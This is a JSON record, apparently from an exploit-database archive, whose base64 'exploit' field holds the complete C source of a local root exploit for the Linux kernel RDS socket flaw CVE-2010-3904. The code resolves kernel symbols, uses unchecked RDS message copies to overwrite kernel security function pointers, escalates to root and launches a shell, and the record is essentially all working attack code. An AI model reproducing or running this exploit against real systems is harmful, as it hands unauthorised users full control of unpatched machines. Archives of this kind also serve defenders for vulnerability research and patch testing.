{
    "source": "exploit-database", 
    "exploit": "Ly8gc291cmNlOiBodHRwOi8vd3d3LnZzZWN1cml0eS5jb20vcmVzb3VyY2VzL2Fkdmlzb3J5LzIwMTAxMDE5LTEvDQoNCi8qIA0KICogTGludXggS2VybmVsIDw9IDIuNi4zNi1yYzggUkRTIHByaXZpbGVnZSBlc2NhbGF0aW9uIGV4cGxvaXQNCiAqIENWRS0yMDEwLTM5MDQNCiAqIGJ5IERhbiBSb3NlbmJlcmcgPGRyb3NlbmJlcmdAdnNlY3VyaXR5LmNvbT4NCiAqDQogKiBDb3B5cmlnaHQgMjAxMCBWaXJ0dWFsIFNlY3VyaXR5IFJlc2VhcmNoLCBMTEMNCiAqDQogKiBUaGUgaGFuZGxpbmcgZnVuY3Rpb25zIGZvciBzZW5kaW5nIGFuZCByZWNlaXZpbmcgUkRTIG1lc3NhZ2VzDQogKiB1c2UgdW5jaGVja2VkIF9fY29weV8qX3VzZXJfaW5hdG9taWMgZnVuY3Rpb25zIHdpdGhvdXQgYW55DQogKiBhY2Nlc3MgY2hlY2tzIG9uIHVzZXItcHJvdmlkZWQgcG9pbnRlcnMuICBBcyBhIHJlc3VsdCwgYnkNCiAqIHBhc3NpbmcgYSBrZXJuZWwgYWRkcmVzcyBhcyBhbiBpb3ZlYyBiYXNlIGFkZHJlc3MgaW4gcmVjdm1zZy1zdHlsZQ0KICogY2FsbHMsIGEgbG9jYWwgdXNlciBjYW4gb3ZlcndyaXRlIGFyYml0cmFyeSBrZXJuZWwgbWVtb3J5LCB3aGljaA0KICogY2FuIGVhc2lseSBiZSB1c2VkIHRvIGVzY2FsYXRlIHByaXZpbGVnZXMgdG8gcm9vdC4gIEFsdGVybmF0aXZlbHksDQogKiBhbiBhcmJpdHJhcnkga2VybmVsIHJlYWQgY2FuIGJlIHBlcmZvcm1lZCB2aWEgc2VuZG1zZyBjYWxscy4NCiAqDQogKiBUaGlzIGV4cGxvaXQgaXMgc2ltcGxlIC0gaXQgcmVzb2x2ZXMgYSBmZXcga2VybmVsIHN5bWJvbHMsDQogKiBzZXRzIHRoZSBzZWN1cml0eV9vcHMgdG8gdGhlIGRlZmF1bHQgc3RydWN0dXJlLCB0aGVuIG92ZXJ3cml0ZXMNCiAqIGEgZnVuY3Rpb24gcG9pbnRlciAocHRyYWNlX3RyYWNlbWUpIGluIHRoYXQgc3RydWN0dXJlIHRvIHBvaW50DQogKiB0byB0aGUgcGF5bG9hZC4gIEFmdGVyIHRyaWdnZXJpbmcgdGhlIHBheWxvYWQsIHRoZSBvcmlnaW5hbA0KICogdmFsdWUgaXMgcmVzdG9yZWQuICBIYXJkLWNvZGluZyB0aGUgb2Zmc2V0IG9mIHRoaXMgZnVuY3Rpb24NCiAqIHBvaW50ZXIgaXMgYSBiaXQgaW5lbGVnYW50LCBidXQgSSB3YW50ZWQgdG8ga2VlcCBpdCBzaW1wbGUgYW5kDQogKiBhcmNoaXRlY3R1cmUtaW5kZXBlbmRlbnQgKGkuZS4gbm8gaW5saW5lIGFzc2VtYmx5KS4NCiAqDQogKiBUaGUgdnVsbmVyYWJpbGl0eSBpcyB5ZXQgYW5vdGhlciBleGFtcGxlIG9mIHdoeSB5b3Ugc2hvdWxkbid0DQogKiBhbGxvdyBsb2FkaW5nIG9mIHJhbmRvbSBwYWNrZXQgZmFtaWxpZXMgdW5sZXNzIHlvdSBhY3R1YWxseQ0KICogbmVlZCB0aGVtLg0KICoNCiAqIEdyZWV0cyB0byBzcGVuZGVyLCBrZWVzLCB0YXZpc28sIGhhd2tlcywgdGVhbSBsb2xsZXJza2F0ZXJzLA0KICogam9iZXJoZWlkZSwgYmxhLCBzdHMsIGFuZCBWU1INCiAqDQogKi8NCg0KDQojaW5jbHVkZSA8c3RkaW8uaD4NCiNpbmNsdWRlIDx1bmlzdGQuaD4NCiNpbmNsdWRlIDxzdGRsaWIuaD4NCiNpbmNsdWRlIDxmY250bC5oPg0KI2luY2x1ZGUgPHN5cy90eXBlcy5oPg0KI2luY2x1ZGUgPHN5cy9zb2NrZXQuaD4NCiNpbmNsdWRlIDxuZXRpbmV0L2luLmg+DQojaW5jbHVkZSA8ZXJybm8uaD4NCiNpbmNsdWRlIDxzdHJpbmcuaD4NCiNpbmNsdWRlIDxzeXMvcHRyYWNlLmg+DQojaW5jbHVkZSA8c3lzL3V0c25hbWUuaD4NCg0KI2RlZmluZSBSRUNWUE9SVCA1NTU1IA0KI2RlZmluZSBTRU5EUE9SVCA2NjY2DQoNCmludCBwcmVwX3NvY2soaW50IHBvcnQpDQp7DQoJDQoJaW50IHMsIHJldDsNCglzdHJ1Y3Qgc29ja2FkZHJfaW4gYWRkcjsNCg0KCXMgPSBzb2NrZXQoUEZfUkRTLCBTT0NLX1NFUVBBQ0tFVCwgMCk7DQoNCglpZihzIDwgMCkgew0KCQlwcmludGYoIlsqXSBDb3VsZCBub3Qgb3BlbiBzb2NrZXQuXG4iKTsNCgkJZXhpdCgtMSk7DQoJfQ0KCQ0KCW1lbXNldCgmYWRkciwgMCwgc2l6ZW9mKGFkZHIpKTsNCg0KCWFkZHIuc2luX2FkZHIuc19hZGRyID0gaW5ldF9hZGRyKCIxMjcuMC4wLjEiKTsNCglhZGRyLnNpbl9mYW1pbHkgPSBBRl9JTkVUOw0KCWFkZHIuc2luX3BvcnQgPSBodG9ucyhwb3J0KTsNCg0KCXJldCA9IGJpbmQocywgKHN0cnVjdCBzb2NrYWRkciAqKSZhZGRyLCBzaXplb2YoYWRkcikpOw0KDQoJaWYocmV0IDwgMCkgew0KCQlwcmludGYoIlsqXSBDb3VsZCBub3QgYmluZCBzb2NrZXQuXG4iKTsNCgkJZXhpdCgtMSk7DQoJfQ0KDQoJcmV0dXJuIHM7DQoNCn0NCg0Kdm9pZCBnZXRfbWVzc2FnZSh1bnNpZ25lZCBsb25nIGFkZHJlc3MsIGludCBzb2NrKQ0Kew0KDQoJcmVjdmZyb20oc29jaywgKHZvaWQgKilhZGRyZXNzLCBzaXplb2Yodm9pZCAqKSwgMCwNCgkJIE5VTEwsIE5VTEwpOw0KDQp9DQoNCnZvaWQgc2VuZF9tZXNzYWdlKHVuc2lnbmVkIGxvbmcgdmFsdWUsIGludCBzb2NrKQ0Kew0KCQ0KCWludCBzaXplLCByZXQ7DQoJc3RydWN0IHNvY2thZGRyX2luIHJlY3ZhZGRyOw0KCXN0cnVjdCBtc2doZHIgbXNnOw0KCXN0cnVjdCBpb3ZlYyBpb3Y7DQoJdW5zaWduZWQgbG9uZyBidWY7DQoJDQoJbWVtc2V0KCZyZWN2YWRkciwgMCwgc2l6ZW9mKHJlY3ZhZGRyKSk7DQoNCglzaXplID0gc2l6ZW9mKHJlY3ZhZGRyKTsNCg0KCXJlY3ZhZGRyLnNpbl9wb3J0ID0gaHRvbnMoUkVDVlBPUlQpOw0KCXJlY3ZhZGRyLnNpbl9mYW1pbHkgPSBBRl9JTkVUOw0KCXJlY3ZhZGRyLnNpbl9hZGRyLnNfYWRkciA9IGluZXRfYWRkcigiMTI3LjAuMC4xIik7DQoNCgltZW1zZXQoJm1zZywgMCwgc2l6ZW9mKG1zZykpOw0KCQ0KCW1zZy5tc2dfbmFtZSA9ICZyZWN2YWRkcjsNCgltc2cubXNnX25hbWVsZW4gPSBzaXplb2YocmVjdmFkZHIpOw0KCW1zZy5tc2dfaW92bGVuID0gMTsNCgkNCglidWYgPSB2YWx1ZTsNCg0KCWlvdi5pb3ZfbGVuID0gc2l6ZW9mKGJ1Zik7DQoJaW92Lmlvdl9iYXNlID0gJmJ1ZjsNCg0KCW1zZy5tc2dfaW92ID0gJmlvdjsNCg0KCXJldCA9IHNlbmRtc2coc29jaywgJm1zZywgMCk7DQoJaWYocmV0IDwgMCkgew0KCQlwcmludGYoIlsqXSBTb21ldGhpbmcgd2VudCB3cm9uZyBzZW5kaW5nLlxuIik7DQoJCWV4aXQoLTEpOw0KCX0NCn0NCg0Kdm9pZCB3cml0ZV90b19tZW0odW5zaWduZWQgbG9uZyBhZGRyLCB1bnNpZ25lZCBsb25nIHZhbHVlLCBpbnQgc2VuZHNvY2ssIGludCByZWN2c29jaykNCnsNCg0KCWlmKCFmb3JrKCkpIHsNCgkJCXNsZWVwKDEpOw0KCQkJc2VuZF9tZXNzYWdlKHZhbHVlLCBzZW5kc29jayk7DQoJCQlleGl0KDEpOw0KCX0NCgllbHNlIHsNCgkJZ2V0X21lc3NhZ2UoYWRkciwgcmVjdnNvY2spOw0KCQl3YWl0KE5VTEwpOw0KCX0NCg0KfQ0KDQp0eXBlZGVmIGludCBfX2F0dHJpYnV0ZV9fKChyZWdwYXJtKDMpKSkgKCogX2NvbW1pdF9jcmVkcykodW5zaWduZWQgbG9uZyBjcmVkKTsNCnR5cGVkZWYgdW5zaWduZWQgbG9uZyBfX2F0dHJpYnV0ZV9fKChyZWdwYXJtKDMpKSkgKCogX3ByZXBhcmVfa2VybmVsX2NyZWQpKHVuc2lnbmVkIGxvbmcgY3JlZCk7DQpfY29tbWl0X2NyZWRzIGNvbW1pdF9jcmVkczsNCl9wcmVwYXJlX2tlcm5lbF9jcmVkIHByZXBhcmVfa2VybmVsX2NyZWQ7DQoNCmludCBfX2F0dHJpYnV0ZV9fKChyZWdwYXJtKDMpKSkNCmdldHJvb3Qodm9pZCAqIGZpbGUsIHZvaWQgKiB2bWEpDQp7DQoNCgljb21taXRfY3JlZHMocHJlcGFyZV9rZXJuZWxfY3JlZCgwKSk7DQoJcmV0dXJuIC0xOwkNCg0KfQ0KDQovKiB0aGFua3Mgc3BlbmRlci4uLiAqLw0KdW5zaWduZWQgbG9uZyBnZXRfa2VybmVsX3N5bShjaGFyICpuYW1lKQ0Kew0KCUZJTEUgKmY7DQoJdW5zaWduZWQgbG9uZyBhZGRyOw0KCWNoYXIgZHVtbXk7DQoJY2hhciBzbmFtZVs1MTJdOw0KCXN0cnVjdCB1dHNuYW1lIHZlcjsNCglpbnQgcmV0Ow0KCWludCByZXAgPSAwOw0KCWludCBvbGRzdHlsZSA9IDA7DQoNCglmID0gZm9wZW4oIi9wcm9jL2thbGxzeW1zIiwgInIiKTsNCglpZiAoZiA9PSBOVUxMKSB7DQoJCWYgPSBmb3BlbigiL3Byb2Mva3N5bXMiLCAiciIpOw0KCQlpZiAoZiA9PSBOVUxMKQ0KCQkJZ290byBmYWxsYmFjazsNCgkJb2xkc3R5bGUgPSAxOw0KCX0NCg0KcmVwZWF0Og0KCXJldCA9IDA7DQoJd2hpbGUocmV0ICE9IEVPRikgew0KCQlpZiAoIW9sZHN0eWxlKQ0KCQkJcmV0ID0gZnNjYW5mKGYsICIlcCAlYyAlc1xuIiwgKHZvaWQgKiopJmFkZHIsICZkdW1teSwgc25hbWUpOw0KCQllbHNlIHsNCgkJCXJldCA9IGZzY2FuZihmLCAiJXAgJXNcbiIsICh2b2lkICoqKSZhZGRyLCBzbmFtZSk7DQoJCQlpZiAocmV0ID09IDIpIHsNCgkJCQljaGFyICpwOw0KCQkJCWlmIChzdHJzdHIoc25hbWUsICJfTy8iKSB8fCBzdHJzdHIoc25hbWUsICJfUy4iKSkNCgkJCQkJY29udGludWU7DQoJCQkJcCA9IHN0cnJjaHIoc25hbWUsICdfJyk7DQoJCQkJaWYgKHAgPiAoKGNoYXIgKilzbmFtZSArIDUpICYmICFzdHJuY21wKHAgLSAzLCAic21wIiwgMykpIHsNCgkJCQkJcCA9IHAgLSA0Ow0KCQkJCQl3aGlsZSAocCA+IChjaGFyICopc25hbWUgJiYgKihwIC0gMSkgPT0gJ18nKQ0KCQkJCQkJcC0tOw0KCQkJCQkqcCA9ICdcMCc7DQoJCQkJfQ0KCQkJfQ0KCQl9DQoJCWlmIChyZXQgPT0gMCkgew0KCQkJZnNjYW5mKGYsICIlc1xuIiwgc25hbWUpOw0KCQkJY29udGludWU7DQoJCX0NCgkJaWYgKCFzdHJjbXAobmFtZSwgc25hbWUpKSB7DQoJCQlmcHJpbnRmKHN0ZG91dCwgIiBbK10gUmVzb2x2ZWQgJXMgdG8gJXAlc1xuIiwgbmFtZSwgKHZvaWQgKilhZGRyLCByZXAgPyAiICh2aWEgU3lzdGVtLm1hcCkiIDogIiIpOw0KCQkJZmNsb3NlKGYpOw0KCQkJcmV0dXJuIGFkZHI7DQoJCX0NCgl9DQoNCglmY2xvc2UoZik7DQoJaWYgKHJlcCkNCgkJcmV0dXJuIDA7DQpmYWxsYmFjazoNCgkvKiBkaWRuJ3QgZmluZCB0aGUgc3ltYm9sLCBsZXQncyByZXRyeSB3aXRoIHRoZSBTeXN0ZW0ubWFwDQoJICAgZGVkaWNhdGVkIHRvIHRoZSBwb2ludGxlc3NuZXNzIG9mIFJ1c3NlbGwgQ29rZXIncyBTRUxpbnV4DQoJICAgdGVzdCBtYWNoaW5lICh3aHkgZG9lcyBoZSBrZWVwIHVwZ3JhZGluZyB0aGUga2VybmVsIGlmDQoJICAgImFsbCBuZWNlc3Nhcnkgc2VjdXJpdHkgY2FuIGJlIHByb3ZpZGVkIGJ5IFNFIExpbnV4Ij8pDQoJKi8NCgl1bmFtZSgmdmVyKTsNCglpZiAoc3RybmNtcCh2ZXIucmVsZWFzZSwgIjIuNiIsIDMpKQ0KCQlvbGRzdHlsZSA9IDE7DQoJc3ByaW50ZihzbmFtZSwgIi9ib290L1N5c3RlbS5tYXAtJXMiLCB2ZXIucmVsZWFzZSk7DQoJZiA9IGZvcGVuKHNuYW1lLCAiciIpOw0KCWlmIChmID09IE5VTEwpDQoJCXJldHVybiAwOw0KCXJlcCA9IDE7DQoJZ290byByZXBlYXQ7DQp9DQoNCmludCBtYWluKGludCBhcmdjLCBjaGFyICogYXJndltdKQ0Kew0KCXVuc2lnbmVkIGxvbmcgc2VjX29wcywgZGVmX29wcywgY2FwX3B0cmFjZSwgdGFyZ2V0Ow0KCWludCBzZW5kc29jaywgcmVjdnNvY2s7DQoJc3RydWN0IHV0c25hbWUgdmVyOw0KDQoJcHJpbnRmKCJbKl0gTGludXgga2VybmVsID49IDIuNi4zMCBSRFMgc29ja2V0IGV4cGxvaXRcbiIpOw0KCXByaW50ZigiWypdIGJ5IERhbiBSb3NlbmJlcmdcbiIpOw0KDQoJdW5hbWUoJnZlcik7DQoNCglpZihzdHJuY21wKHZlci5yZWxlYXNlLCAiMi42LjMiLCA1KSkgew0KCQlwcmludGYoIlsqXSBZb3VyIGtlcm5lbCBpcyBub3QgdnVsbmVyYWJsZS5cbiIpOw0KCQlyZXR1cm4gLTE7DQoJfQkNCg0KCS8qIFJlc29sdmUgYWRkcmVzc2VzIG9mIHJlbGV2YW50IHN5bWJvbHMgKi8NCglwcmludGYoIlsqXSBSZXNvbHZpbmcga2VybmVsIGFkZHJlc3Nlcy4uLlxuIik7DQoJc2VjX29wcyA9IGdldF9rZXJuZWxfc3ltKCJzZWN1cml0eV9vcHMiKTsNCglkZWZfb3BzID0gZ2V0X2tlcm5lbF9zeW0oImRlZmF1bHRfc2VjdXJpdHlfb3BzIik7DQoJY2FwX3B0cmFjZSA9IGdldF9rZXJuZWxfc3ltKCJjYXBfcHRyYWNlX3RyYWNlbWUiKTsNCgljb21taXRfY3JlZHMgPSAoX2NvbW1pdF9jcmVkcykgZ2V0X2tlcm5lbF9zeW0oImNvbW1pdF9jcmVkcyIpOw0KCXByZXBhcmVfa2VybmVsX2NyZWQgPSAoX3ByZXBhcmVfa2VybmVsX2NyZWQpIGdldF9rZXJuZWxfc3ltKCJwcmVwYXJlX2tlcm5lbF9jcmVkIik7DQoNCglpZighc2VjX29wcyB8fCAhZGVmX29wcyB8fCAhY2FwX3B0cmFjZSB8fCAhY29tbWl0X2NyZWRzIHx8ICFwcmVwYXJlX2tlcm5lbF9jcmVkKSB7DQoJCXByaW50ZigiWypdIEZhaWxlZCB0byByZXNvbHZlIGtlcm5lbCBzeW1ib2xzLlxuIik7DQoJCXJldHVybiAtMTsNCgl9DQoNCgkvKiBDYWxjdWxhdGUgdGFyZ2V0ICovDQoJdGFyZ2V0ID0gZGVmX29wcyArIHNpemVvZih2b2lkICopICsgKCgxMSArIHNpemVvZih2b2lkICopKSAmIH4oc2l6ZW9mKHZvaWQgKikgLSAxKSk7DQoNCglzZW5kc29jayA9IHByZXBfc29jayhTRU5EUE9SVCk7DQoJcmVjdnNvY2sgPSBwcmVwX3NvY2soUkVDVlBPUlQpOw0KDQoJLyogUmVzZXQgc2VjdXJpdHkgb3BzICovDQoJcHJpbnRmKCJbKl0gT3ZlcndyaXRpbmcgc2VjdXJpdHkgb3BzLi4uXG4iKTsNCgl3cml0ZV90b19tZW0oc2VjX29wcywgZGVmX29wcywgc2VuZHNvY2ssIHJlY3Zzb2NrKTsNCg0KCS8qIE92ZXJ3cml0ZSBwdHJhY2VfdHJhY2VtZSBzZWN1cml0eSBvcCBmcHRyICovDQoJcHJpbnRmKCJbKl0gT3ZlcndyaXRpbmcgZnVuY3Rpb24gcG9pbnRlci4uLlxuIik7DQoJd3JpdGVfdG9fbWVtKHRhcmdldCwgKHVuc2lnbmVkIGxvbmcpJmdldHJvb3QsIHNlbmRzb2NrLCByZWN2c29jayk7DQoNCgkvKiBUcmlnZ2VyIHRoZSBwYXlsb2FkICovDQoJcHJpbnRmKCJbKl0gVHJpZ2dlcmluZyBwYXlsb2FkLi4uXG4iKTsNCglwdHJhY2UoUFRSQUNFX1RSQUNFTUUsIDEsIE5VTEwsIE5VTEwpOw0KCQ0KCS8qIFJlc3RvcmUgdGhlIHB0cmFjZV90cmFjZW1lIHNlY3VyaXR5IG9wICovDQoJcHJpbnRmKCJbKl0gUmVzdG9yaW5nIGZ1bmN0aW9uIHBvaW50ZXIuLi5cbiIpOw0KCXdyaXRlX3RvX21lbSh0YXJnZXQsIGNhcF9wdHJhY2UsIHNlbmRzb2NrLCByZWN2c29jayk7DQoNCglpZihnZXR1aWQoKSkgew0KCQlwcmludGYoIlsqXSBFeHBsb2l0IGZhaWxlZCB0byBnZXQgcm9vdC5cbiIpOw0KCQlyZXR1cm4gLTE7DQoJfQ0KDQoJcHJpbnRmKCJbKl0gR290IHJvb3QhXG4iKTsNCglleGVjbCgiL2Jpbi9zaCIsICJzaCIsIE5VTEwpOw0KDQp9", 
    "filename": "platforms/linux/local/15285.c", 
    "id": "15285", 
    "cves": [
        "CVE-2010-3904"
    ]
}